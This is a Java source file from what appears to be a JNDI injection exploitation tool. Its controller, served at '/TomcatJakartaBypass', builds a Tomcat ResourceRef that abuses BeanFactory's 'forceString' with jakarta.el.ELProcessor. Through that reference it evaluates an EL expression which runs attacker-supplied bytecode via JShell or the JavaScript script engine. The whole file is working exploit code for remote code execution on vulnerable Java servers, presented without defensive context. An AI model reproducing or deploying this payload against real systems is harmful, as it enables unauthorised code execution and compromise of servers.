package map.jndi.controller.bypass;

import map.jndi.Main;
import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.controller.BasicController;
import map.jndi.payload.JShellPayload;
import map.jndi.payload.JavaScriptPayload;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

@JNDIController
@JNDIMapping("/TomcatJakartaBypass")
public class TomcatJakartaBypassController extends BasicController {
    @Override
    public Object process(byte[] byteCode) {
        System.out.println("[Reference] Factory: BeanFactory + ELProcessor");

        ResourceRef ref = new ResourceRef("jakarta.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));

        if (Main.config.jshell) {
            String code = JShellPayload.loadClass(byteCode);
            ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"jdk.jshell.JShell\").getMethod(\"create\").invoke(null).eval(\"" + code.replace("\"", "\\\"") + "\")"));
        } else {
            String code = JavaScriptPayload.loadClass(byteCode);
            ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + code + "\")"));
        }

        return ref;
    }
}
